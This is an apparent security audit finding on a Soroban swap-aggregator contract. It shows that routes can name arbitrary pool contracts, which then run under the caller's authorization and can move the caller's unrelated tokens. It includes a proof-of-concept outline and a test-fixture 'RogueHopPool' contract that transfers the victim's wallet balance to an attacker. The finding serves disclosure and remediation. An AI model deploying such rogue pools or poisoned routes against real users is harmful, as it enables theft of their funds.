### Title
Attacker-controlled route executes arbitrary pool code inside the caller’s authorization tree - (File: contracts/swap-aggregator/src/execute/mod.rs)

### Summary
`execute_strategy` accepts a caller-supplied address registry and packed instruction stream, authenticates only the supplied `sender`, and invokes whichever `pool` address a route names under that root authorization. This lets a poisoned route place attacker-controlled contract code inside the victim’s signed authorization tree, analogous to injecting arbitrary SQL through an otherwise authenticated request.

### Finding Description
`execute_strategy` decodes `StrategyPayload` and calls `execute::run`, which calls `sender.require_auth()` and pulls `total_in` from `token_in`. [1](#0-0) [2](#0-1) 

`Program::decode` validates registry indices and structural route rules, but the `idx_a` field is only an index into the caller-provided `assets` vector; it is not checked against a venue or pool allowlist. [3](#0-2) [4](#0-3) 

Execution constructs `SwapHop.pool` directly from `assets[idx_a]` and dispatches the selected venue adapter. [5](#0-4)  `dispatch_hop` then calls venue-specific code and measures token balance deltas, but measurement does not constrain what the callee does while it is on the call stack. [6](#0-5) 

Because `sender.require_auth()` is the active authorization root, a malicious contract implementing the selected venue’s expected pool ABI can request `token.transfer(victim, attacker, amount)` for another token. An honest simulation records that transfer as a child of the victim’s `execute_strategy` authorization; if the user signs that generated tree, the host accepts it and transfers the unrelated wallet funds. [7](#0-6) 

### Impact Explanation
A crafted route can steal token balances unrelated to `total_in` from the signing user. The repository’s PoC demonstrates a victim retaining the expected `ETH` route output while an attacker receives the victim’s entire unrelated `WALLET_BALANCE`. [7](#0-6) 

This is theft of user funds because the malicious transfer is authorized by the victim’s injected auth tree even though the sender explicitly intended to authorize only the input-token pull and receive the declared output. [8](#0-7) 

### Likelihood Explanation
Any unprivileged attacker can deploy a contract that implements the ABI expected by a selected venue, encode its address as a route `pool`, and deliver the payload through a quote service, malicious interface, phishing flow, or compromised route source. `Program::decode` permits arbitrary registry addresses, and the test fixture demonstrates both the malicious venue call and the resulting signed authorization. [5](#0-4) [9](#0-8) 

The exploit requires the victim to submit a transaction using the malicious route and sign the simulated authorization containing the rogue child invocation. Standard route construction and simulation make that child easy for a non-technical signer to miss, so this is a high-impact authenticated-input injection rather than a permissionless remote drain. [8](#0-7) 

### Recommendation
Restrict route `pool` addresses to a governance-managed, per-venue allowlist before execution. Validate the mapping during `Program::decode` or in `execute_op`, before any external pool call, rather than relying only on measured input/output deltas.

Alternatively, deploy a venue-pool registry that resolves a pool identifier to a stored contract address, so route payloads cannot supply executable addresses directly. Wallets and the quote service should also reject authorization trees containing any child invocation other than the expected `token_in.transfer(sender, router, total_in)`, but client-side checks should be a secondary defense. [5](#0-4) [8](#0-7) 

### Proof of Concept
1. Deploy a malicious `RogueHopPool` contract that implements the selected pool ABI and calls `token.transfer(victim, attacker, victim_wallet_balance)` during `swap`. [10](#0-9) 
2. Construct a `StrategyPayload` whose `assets` registry includes the malicious contract as `pool`, a legitimate input token as `token_in`, and a funded output token as `token_out`; encode a swap instruction referencing the rogue pool index. [11](#0-10) 
3. Have the victim call `execute_strategy(sender = victim, total_in, swap_xdr)` through a wallet flow. Simulation records a child `wallet_token.transfer(victim, attacker, victim_wallet_balance)` beneath the victim’s root authorization. [12](#0-11) 
4. When the victim signs that tree, the malicious transfer succeeds alongside the fair-looking swap output. [13](#0-12)

### Citations

**File:** contracts/swap-aggregator/src/lib.rs (L245-255)
```rust
    /// Decodes `swap_xdr` as a `StrategyPayload` and runs it for `sender`.
    ///
    /// Requires `sender` authorization. Pulls `total_in` of the input token, runs the
    /// instruction stream, applies fees, checks the minimum output, and returns the amount
    /// delivered to `sender`. Panics with `Error::InvalidRouteXdr` if the XDR does not decode.
    fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        renew_instance(&env);
        let payload = StrategyPayload::from_xdr(&env, &swap_xdr)
            .unwrap_or_else(|_| panic_with_error!(&env, Error::InvalidRouteXdr));
        execute::run(env, sender, total_in, payload)
    }
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L51-86)
```rust
pub(crate) fn run(env: Env, sender: Address, total_in: i128, payload: StrategyPayload) -> i128 {
    sender.require_auth();

    if total_in <= 0 {
        panic_with_error!(&env, Error::InvalidAmount);
    }

    let StrategyPayload {
        amounts,
        assets,
        ops,
    } = payload;
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());

    let input_token = assets.get_unchecked(program.token_in);
    let output_token = assets.get_unchecked(program.token_out);
    let total_min_out = amounts.get_unchecked(program.min_out);
    if total_min_out <= 0 {
        panic_with_error!(&env, Error::SlippageExceeded);
    }

    let router = env.current_contract_address();
    let mut vault = Vault::new(&env);
    let mut tokens_cache: Map<Address, Vec<Address>> = Map::new(&env);

    // Credit the measured delta, not declared `total_in`: a fee-on-transfer
    // input would otherwise draw the shortfall from the fee reserve.
    let credited_in = transfer_amount_measured(
        &env,
        &input_token,
        &sender,
        &router,
        total_in,
        GenericError::AmountMustBePositive,
    );
    vault.deposit(&input_token, credited_in);
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-170)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
                panic_with_error!(ctx.env, Error::ZeroOutput);
            }
            vault.deposit(&hop.token_out, out);
            Some((hop.token_out, out))
```

**File:** contracts/swap-aggregator/src/program.rs (L183-233)
```rust
    pub(crate) fn decode(env: &Env, ops: &Bytes, assets_len: u32, amounts_len: u32) -> Self {
        if assets_len == 0 || assets_len > MAX_ASSETS || amounts_len > MAX_AMOUNTS {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }

        let len = ops.len();
        if len < HEADER_LEN || len as usize > MAX_PROGRAM_BYTES {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }

        let mut buf = [0u8; MAX_PROGRAM_BYTES];
        ops.copy_into_slice(&mut buf[..len as usize]);

        if buf[head::VERSION] != VERSION {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }

        let op_count = buf[head::OP_COUNT] as u32;
        let weight_count = buf[head::WEIGHT_COUNT] as u32;
        if op_count == 0 || op_count > MAX_OPS || weight_count > MAX_WEIGHTS {
            panic_with_error!(env, Error::EmptyBatch);
        }
        let weights_at = HEADER_LEN + OP_LEN * op_count;
        if len != weights_at + WEIGHT_LEN * weight_count {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }

        let token_in = buf[head::TOKEN_IN] as u32;
        let token_out = buf[head::TOKEN_OUT] as u32;
        let min_out = buf[head::MIN_OUT] as u32;
        if token_in >= assets_len || token_out >= assets_len || min_out >= amounts_len {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }
        if token_in == token_out {
            panic_with_error!(env, Error::SameToken);
        }

        let referral = &buf[head::REFERRAL..head::REFERRAL + 4];
        let referral_id =
            u32::from_be_bytes([referral[0], referral[1], referral[2], referral[3]]) as u64;

        let program = Self {
            buf,
            op_count,
            weights_at,
            token_in,
            token_out,
            min_out,
            referral_id,
        };
        program.validate(env, assets_len, amounts_len, weight_count);
```

**File:** contracts/swap-aggregator/src/program.rs (L237-303)
```rust
    /// Validates every instruction's opcode, mode, and indices before execution begins,
    /// including the `Prev` chain, same-token swaps, and split-weight bounds.
    fn validate(&self, env: &Env, assets_len: u32, amounts_len: u32, weight_count: u32) {
        for i in 0..self.op_count {
            let record = self.raw(i);
            let Some(opcode) = Opcode::from_u8(record[field::OPCODE]) else {
                panic_with_error!(env, Error::InvalidRouteXdr);
            };
            let mode = Mode::from_u8(record[field::MODE]);
            let (idx_a, idx_b, idx_c) = (
                record[field::POOL] as u32,
                record[field::TOKEN_IN] as u32,
                record[field::TOKEN_OUT] as u32,
            );

            // `Prev` is a purely structural link: the predecessor must exist,
            // must have a single output, and that output must be this
            // instruction's input.
            if mode == Mode::Prev {
                if i == 0 {
                    panic_with_error!(env, Error::BrokenTokenChain);
                }
                let previous = self.raw(i - 1);
                let produced = match Opcode::from_u8(previous[field::OPCODE]) {
                    // A swap produces its `token_out`, a mint its share token.
                    Some(Opcode::Swap(_)) => previous[field::TOKEN_OUT],
                    Some(Opcode::Mint) => previous[field::TOKEN_IN],
                    // A burn releases every constituent at once.
                    _ => panic_with_error!(env, Error::BrokenTokenChain),
                };
                if idx_b != produced as u32 {
                    panic_with_error!(env, Error::BrokenTokenChain);
                }
            }
            match mode {
                Mode::Fixed(idx) if idx as u32 >= amounts_len => {
                    panic_with_error!(env, Error::InvalidRouteXdr)
                }
                Mode::Ppm(idx) if idx as u32 >= weight_count => {
                    panic_with_error!(env, Error::InvalidRouteXdr)
                }
                _ => {}
            }

            if idx_a >= assets_len || idx_b >= assets_len {
                panic_with_error!(env, Error::InvalidRouteXdr);
            }
            match opcode {
                Opcode::Swap(_) => {
                    if idx_c >= assets_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_b == idx_c {
                        panic_with_error!(env, Error::SameToken);
                    }
                }
                // Liquidity legs spend the full vault balance, so only `Mode::All` is valid.
                Opcode::Burn | Opcode::Mint => {
                    if mode != Mode::All {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_c >= amounts_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                }
            }
        }
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L17-59)
```rust
/// Dispatches the hop to its venue-specific swap function and returns the measured increase in
/// the router's `token_out` balance. Panics with `Error::ZeroOutput` if the output balance does
/// not strictly increase, and with `Error::InvalidAmount` if the router's `token_in` balance does
/// not decrease by exactly `amount_in`.
///
/// Venue adapters return nothing: this measured delta is the only fill the router credits.
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };

    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }

    received
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-72)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
